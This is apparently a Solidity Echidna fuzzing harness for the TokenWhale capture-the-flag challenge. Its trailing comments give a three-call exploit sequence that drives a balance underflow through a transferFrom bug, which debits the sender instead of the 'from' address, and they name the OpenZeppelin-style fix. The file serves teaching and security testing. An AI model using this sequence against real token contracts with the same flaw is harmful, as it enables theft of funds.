// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

/// @dev Run the template with
///      ```
///      solc-select use 0.4.25 --always-install
///      echidna src/TokenWhale/TokenWhaleChallenge.t.sol --contract TokenWhaleChallengeTest
///      ```
contract TokenWhaleChallengeTest is TokenWhaleChallenge {
    address echidna = msg.sender;

    function TokenWhaleChallengeTest() public TokenWhaleChallenge(msg.sender) {}

    function echidna_test_balance() public view returns (bool) {
        return !isComplete();
    }
}

// Solution (from echidna + interpretation)

// 0x10000 = A
// 0x30000 = B
// B has starting balance of 1000 tokens

// B calls approve(A, large_number);
// A calls transferFrom(B, B, 697); // this should underflow the balance of A
// A calls transfer(A, 99999); // A now has infinite tokens to send to B

// explanation: transferFrom() sends tokens from msg.sender instead of the from address.
// Correction: OZ ERC20.sol does ```_transfer(from, to, value);```